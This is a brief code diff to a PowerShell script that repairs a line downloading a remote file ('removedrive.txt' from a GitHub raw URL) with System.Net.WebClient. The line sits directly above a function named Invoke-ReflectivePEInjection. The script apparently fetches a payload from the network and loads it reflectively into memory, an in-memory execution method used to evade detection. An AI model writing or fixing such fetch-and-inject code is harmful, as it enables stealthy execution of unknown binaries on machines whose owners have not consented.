@@ -1,4 +1,4 @@
-$InputString = (System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/kasperstyre/usefulsnippets/master/removedrive.txt')
+$InputString = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/kasperstyre/usefulsnippets/master/removedrive.txt')
  
 function Invoke-ReflectivePEInjection
 {
